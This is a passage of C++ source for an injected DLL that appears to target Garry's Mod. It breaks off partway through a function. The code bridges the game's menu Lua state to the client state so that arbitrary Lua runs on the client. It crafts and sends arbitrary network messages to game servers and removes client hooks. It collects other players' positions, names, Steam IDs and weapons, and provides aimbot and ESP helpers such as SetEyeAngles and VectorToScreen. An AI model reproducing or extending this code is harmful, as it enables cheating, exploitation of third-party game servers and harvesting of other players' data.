// dll_pwned_main.cpp : définit les fonctions exportées pour l'application DLL.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <chrono>
#include <thread>
#include "GLua.h"
#include "Types.h"
#include "UserData.h"
#include "LuaBase.h"
#include <string>
#include <iostream>

ILuaShared* LuaShared = NULL;
ILuaInterface* CLLUA = NULL;
ILuaInterface* MenuLua = NULL;



using namespace std;

int IsPooled(lua_State* state)
{
	std::string messageName;

	if (MenuLua->IsType(1, Type::STRING))
	{
		unsigned int i;
		const char* str = MenuLua->GetString(1, &i);
		messageName = std::string(str, i);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "util");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "NetworkStringToID");
	ClientLua->Remove(-2);
	ClientLua->PushString(messageName.c_str(), messageName.length());
	ClientLua->Call(1, 1);
	int b = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	MenuLua->PushNumber(b);
	return 1;
}

int ExecuteOnClient(lua_State* state)
{
	
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->RunString("", "", MenuLua->GetString(1), true, true);
	return 0;
}

int IsClientLua(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	if (ClientLua != NULL)
	{
		MenuLua->PushBool(true);
	}
	else
	{
		MenuLua->PushBool(false);
	}
	return 1;
}

int FileExists(lua_State* state)
{
	std::string file;
	file = MenuLua->GetString(1);
	std::string path;
	path = MenuLua->GetString(2);
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "file");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Exists");
	ClientLua->Remove(-2);
	ClientLua->PushString(file.c_str());
	ClientLua->PushString(path.c_str());
	ClientLua->Call(2, 1);
	bool ret = ClientLua->GetBool(-1);
	ClientLua->Pop();
	MenuLua->PushBool(ret);
	return 1;
}

int VarExists(lua_State* state)
{
	std::string var;
	var = MenuLua->GetString(1);
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, var.c_str());
	ClientLua->Remove(-2);
	bool ret = !ClientLua->IsType(1, Type::NIL);
	ClientLua->Pop();
	MenuLua->PushBool(ret);
	return 1;
}

int netStart(lua_State* state)
{
	std::string messageName;
	bool unreliable = false;
	if (MenuLua->IsType(1, Type::STRING))
	{
		unsigned int i;
		const char* str = MenuLua->GetString(1, &i);
		messageName = std::string(str, i);
	}
	if (MenuLua->IsType(2, Type::BOOL))
	{
		unreliable = MenuLua->GetBool(2);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Start");
	ClientLua->Remove(-2);
	ClientLua->PushString(messageName.c_str(), messageName.length());
	ClientLua->PushBool(unreliable);
	ClientLua->Call(2, 1);
	bool b = ClientLua->GetBool(-1);
	ClientLua->Pop();
	MenuLua->PushBool(b);
	return 1;
}

int netSendToServer(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "SendToServer");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 0);
	return 0;
}



void getAngle(double pitch, double yaw, double roll)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "Angle");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(pitch);
	ClientLua->PushNumber(yaw);
	ClientLua->PushNumber(roll);
	ClientLua->Call(3, 1);
}

void getColor(double r, double g, double b, double a)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "Color");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(r);
	ClientLua->PushNumber(g);
	ClientLua->PushNumber(b);
	ClientLua->PushNumber(a);
	ClientLua->Call(4, 1);
}

int netWriteBit(lua_State* state)
{
	bool b = false;
	if (MenuLua->IsType(1, Type::BOOL))
	{
		b = MenuLua->GetBool(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteBit");
	ClientLua->Remove(-2);
	ClientLua->PushBool(b);
	ClientLua->Call(1, 0);
	return 0;
}

int netWriteBool(lua_State* state)
{
	bool b = false;
	if (MenuLua->IsType(1, Type::BOOL))
	{
		b = MenuLua->GetBool(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteBool");
	ClientLua->Remove(-2);
	ClientLua->PushBool(b);
	ClientLua->Call(1, 0);
	return 0;
}

int netWriteColor(lua_State* state)
{

	double r = 0;
	double g = 0;
	double b = 0;
	double a = 255;
	if (MenuLua->IsType(1, Type::TABLE))
	{
		MenuLua->GetField(1, "r");
		r = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "g");
		g = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "b");
		b = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "a");
		a = MenuLua->GetNumber(-1);
		MenuLua->Pop();
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteColor");
	ClientLua->Remove(-2);
	getColor(r, g, b, a);
	ClientLua->Call(1, 0);
	return 0;
}

int netWriteData(lua_State* state)
{
	std::string binaryData;
	double length = 0;
	if (MenuLua->IsType(1, Type::STRING))
	{
		unsigned int i;
		const char* str = MenuLua->GetString(1, &i);
		binaryData = std::string(str, i);
	}
	if (MenuLua->IsType(2, Type::NUMBER))
	{
		length = MenuLua->GetNumber(2);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteData");
	ClientLua->Remove(-2);
	ClientLua->PushString(binaryData.c_str(), binaryData.length());
	ClientLua->PushNumber(length);
	ClientLua->Call(2, 0);
	return 0;
}

int netWriteDouble(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteDouble");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(d);
	ClientLua->Call(1, 0);
	return 0;
}

int netWriteFloat(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteFloat");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(d);
	ClientLua->Call(1, 0);
	return 0;
}

int netWriteInt(lua_State* state)
{
	double d = 0;
	double bitCount = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	if (MenuLua->IsType(2, Type::NUMBER))
	{
		bitCount = MenuLua->GetNumber(2);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteInt");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(d);
	ClientLua->PushNumber(bitCount);
	ClientLua->Call(2, 0);
	return 0;
}



void getVectorClient(double x, double y, double z)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "Vector");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(x);
	ClientLua->PushNumber(y);
	ClientLua->PushNumber(z);
	ClientLua->Call(3, 1);
}

int netWriteString(lua_State* state)
{
	std::string s;
	if (MenuLua->IsType(1, Type::STRING))
	{
		unsigned int i;
		const char* str = MenuLua->GetString(1, &i);
		s = std::string(str, i);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteString");
	ClientLua->Remove(-2);
	ClientLua->PushString(s.c_str(), s.length());
	ClientLua->Call(1, 0);
	return 0;
}



std::string utilTableToJSONMenu(int iStackPos)
{
	MenuLua->PushSpecial(SPECIAL_GLOB);
	MenuLua->GetField(-1, "util");
	MenuLua->Remove(-2);
	MenuLua->GetField(-1, "TableToJSON");
	MenuLua->Remove(-2);
	MenuLua->Push(iStackPos);
	if (iStackPos < 0)
	{
		MenuLua->Remove(iStackPos - 1);
	}
	MenuLua->PushBool(false);
	MenuLua->Call(2, 1);
	unsigned int i;
	const char* str = MenuLua->GetString(-1, &i);
	std::string s = std::string(str, i);
	MenuLua->Pop();
	return s;
}

std::string utilTableToJSONClient(int iStackPos)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "util");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "TableToJSON");
	ClientLua->Remove(-2);
	ClientLua->Push(iStackPos);
	if (iStackPos < 0)
	{
		ClientLua->Remove(iStackPos - 1);
	}
	ClientLua->PushBool(false);
	ClientLua->Call(2, 1);
	unsigned int i;
	const char* str = ClientLua->GetString(-1, &i);
	std::string s = std::string(str, i);
	ClientLua->Pop();
	return s;
}

void utilJSONToTableMenu(std::string json)
{
	MenuLua->PushSpecial(SPECIAL_GLOB);
	MenuLua->GetField(-1, "util");
	MenuLua->Remove(-2);
	MenuLua->GetField(-1, "JSONToTable");
	MenuLua->Remove(-2);
	MenuLua->PushString(json.c_str(), json.length());
	MenuLua->Call(1, 1);
}

void utilJSONToTableClient(std::string json)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "util");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "JSONToTable");
	ClientLua->Remove(-2);
	ClientLua->PushString(json.c_str(), json.length());
	ClientLua->Call(1, 1);
}

int netWriteTable(lua_State* state)
{
	std::string json;
	if (MenuLua->IsType(1, Type::TABLE))
	{
		json = utilTableToJSONMenu(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteTable");
	ClientLua->Remove(-2);
	utilJSONToTableClient(json);
	ClientLua->Call(1, 0);
	return 0;
}



int netWriteUInt(lua_State* state)
{
	double d = 0;
	double numberOfBits = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	if (MenuLua->IsType(2, Type::NUMBER))
	{
		numberOfBits = MenuLua->GetNumber(2);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteUInt");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(d);
	ClientLua->PushNumber(numberOfBits);
	ClientLua->Call(2, 0);
	return 0;
}

int RemoveHook(lua_State* state)
{
	double d = 0;
	double numberOfBits = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	if (MenuLua->IsType(2, Type::NUMBER))
	{
		numberOfBits = MenuLua->GetNumber(2);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "hook");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Remove");
	ClientLua->Remove(-2);
	ClientLua->PushString(MenuLua->GetString(1));
	ClientLua->PushString(MenuLua->GetString(2));
	ClientLua->Call(2, 0);
	return 0;
}


int netWriteVector(lua_State* state)
{
	double x = 0;
	double y = 0;
	double z = 0;
	if (MenuLua->IsType(1, Type::VECTOR))
	{
		MenuLua->GetField(1, "x");
		x = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "y");
		y = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "z");
		z = MenuLua->GetNumber(-1);
		MenuLua->Pop();
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "net");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "WriteVector");
	ClientLua->Remove(-2);
	getVectorClient(x, y, z);
	ClientLua->Call(1, 0);
	return 0;
}
void getLocalPlayer()
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "LocalPlayer");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
}


int entsFindByClass(lua_State* state)
{
	std::string classname;
	if (MenuLua->IsType(1, Type::STRING))
	{
		unsigned int i;
		const char* str = MenuLua->GetString(1, &i);
		classname = std::string(str, i);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "ents");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "FindByClass");
	ClientLua->Remove(-2);
	ClientLua->PushString(classname.c_str(), classname.length());
	ClientLua->Call(1, 1);

	MenuLua->CreateTable();
	unsigned int tableIndex = 1;

	ClientLua->PushNil();
	while (ClientLua->Next(-2))
	{
		ClientLua->PushSpecial(SPECIAL_GLOB);
		ClientLua->GetField(-1, "debug");
		ClientLua->Remove(-2);
		ClientLua->GetField(-1, "getregistry");
		ClientLua->Remove(-2);
		ClientLua->Call(0, 1);
		ClientLua->GetField(-1, "Entity");
		ClientLua->Remove(-2);
		ClientLua->GetField(-1, "EntIndex");
		ClientLua->Remove(-2);
		ClientLua->Push(-2);
		ClientLua->Call(1, 1);
		double entIndex = ClientLua->GetNumber(-1);
		MenuLua->PushNumber(tableIndex);
		MenuLua->PushNumber(entIndex);
		MenuLua->SetTable(-3);
		ClientLua->Pop();
		ClientLua->Pop();
		tableIndex++;
	}
	ClientLua->Pop();
	return 1;
}


void entsGetByIndex(double entIndex)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "ents");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetByIndex");
	ClientLua->Remove(-2);
	ClientLua->PushNumber(entIndex);
	ClientLua->Call(1, 1);
}


int EntityGetWepons(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetWeapons");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	MenuLua->CreateTable();
	unsigned int tableIndex = 1;
	ClientLua->PushNil();
	while (ClientLua->Next(-2))
	{
		ClientLua->PushSpecial(SPECIAL_GLOB);
		ClientLua->GetField(-1, "debug");
		ClientLua->Remove(-2);
		ClientLua->GetField(-1, "getregistry");
		ClientLua->Remove(-2);
		ClientLua->Call(0, 1);
		ClientLua->GetField(-1, "Entity");
		ClientLua->Remove(-2);
		ClientLua->GetField(-1, "EntIndex");
		ClientLua->Remove(-2);
		ClientLua->Push(-2);
		ClientLua->Call(1, 1);
		double entIndex = ClientLua->GetNumber(-1);
		MenuLua->PushNumber(tableIndex);
		MenuLua->PushNumber(entIndex);
		MenuLua->SetTable(-3);
		ClientLua->Pop();
		ClientLua->Pop();
		tableIndex++;
	}
	ClientLua->Pop();
	return 1;
}

int LocalPlayerEntIndex(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "EntIndex");
	ClientLua->Remove(-2);
	getLocalPlayer();
	ClientLua->Call(1, 1);
	double entIndex = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	MenuLua->PushNumber(entIndex);
	return 1;
}

int Distance(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);

	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Vector");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Distance");
	ClientLua->Remove(-2);
	getVectorClient(MenuLua->GetNumber(1), MenuLua->GetNumber(2), MenuLua->GetNumber(3));
	getVectorClient(MenuLua->GetNumber(4), MenuLua->GetNumber(5), MenuLua->GetNumber(6));
	ClientLua->Call(2, 1);
	double Distance = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	MenuLua->PushNumber(Distance);
	return 1;
}

void getVectorMenu(double x, double y, double z)
{
	MenuLua->PushSpecial(SPECIAL_GLOB);
	MenuLua->GetField(-1, "Vector");
	MenuLua->Remove(-2);
	MenuLua->PushNumber(x);
	MenuLua->PushNumber(y);
	MenuLua->PushNumber(z);
	MenuLua->Call(3, 1);
}



int PlayerNick(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Nick");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	unsigned int i;
	const char* str = ClientLua->GetString(-1, &i);
	std::string nick = std::string(str, i);
	ClientLua->Pop();
	MenuLua->PushString(nick.c_str(), nick.length());
	return 1;
}


int SteamID(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "SteamID");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	unsigned int i;
	const char* str = ClientLua->GetString(-1, &i);
	std::string nick = std::string(str, i);
	ClientLua->Pop();
	MenuLua->PushString(nick.c_str(), nick.length());
	return 1;
}

int EntityIsValid(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "IsValid");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	bool b = ClientLua->GetBool(-1);
	ClientLua->Pop();
	MenuLua->PushBool(b);
	return 1;
}


int GetAngleFromVector(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Vector");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Angle");
	ClientLua->Remove(-2);
	getVectorClient(MenuLua->GetNumber(1), MenuLua->GetNumber(2), MenuLua->GetNumber(3));
	ClientLua->Call(1, 1);
	double x = 0;
	double y = 0;
	double z = 0;
	ClientLua->GetField(-1, "x");
	x = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	y = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "z");
	z = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	MenuLua->PushNumber(x);
	MenuLua->PushNumber(y);
	MenuLua->PushNumber(z);
	return 3;
}


int GetNormalized(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Vector");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetNormalized");
	ClientLua->Remove(-2);
	getVectorClient(MenuLua->GetNumber(1), MenuLua->GetNumber(2), MenuLua->GetNumber(3));
	ClientLua->Call(1, 1);
	double x = 0;
	double y = 0;
	double z = 0;
	ClientLua->GetField(-1, "x");
	x = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	y = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "z");
	z = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	MenuLua->PushNumber(x);
	MenuLua->PushNumber(y);
	MenuLua->PushNumber(z);
	return 3;
}

int SetEyeAngles(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "SetEyeAngles");
	ClientLua->Remove(-2);
	getLocalPlayer();
	getAngle(MenuLua->GetNumber(1), MenuLua->GetNumber(2), MenuLua->GetNumber(3));
	ClientLua->Call(2, 0);
	return 0;
}
int GetShootingPos(lua_State* state)
{
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetShootPos");
	ClientLua->Remove(-2);
	getLocalPlayer();
	ClientLua->Call(1, 1);
	double x = 0;
	double y = 0;
	double z = 0;
	ClientLua->GetField(-1, "x");
	x = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	y = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "z");
	z = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	getVectorMenu(x, y, z);
	return 1;
}
int EntityGetPos(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetPos");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	double x = 0;
	double y = 0;
	double z = 0;
	ClientLua->GetField(-1, "x");
	x = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	y = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "z");
	z = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	getVectorMenu(x, y, z);
	return 1;
}

int VectorToScreen(lua_State* state)
{
	double x = 0;
	double y = 0;
	double z = 0;
	if (MenuLua->IsType(1, Type::VECTOR))
	{
		MenuLua->GetField(1, "x");
		x = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "y");
		y = MenuLua->GetNumber(-1);
		MenuLua->Pop();
		MenuLua->GetField(1, "z");
		z = MenuLua->GetNumber(-1);
		MenuLua->Pop();
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Vector");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "ToScreen");
	ClientLua->Remove(-2);
	getVectorClient(x, y, z);
	ClientLua->Call(1, 1);
	ClientLua->GetField(-1, "x");
	double x2 = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	double y2 = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "visible");
	bool visible = ClientLua->GetBool(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	MenuLua->CreateTable();
	MenuLua->PushNumber(x2);
	MenuLua->SetField(-2, "x");
	MenuLua->PushNumber(y2);
	MenuLua->SetField(-2, "y");
	MenuLua->PushBool(visible);
	MenuLua->SetField(-2, "visible");
	return 1;
}

int PlayerAlive(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
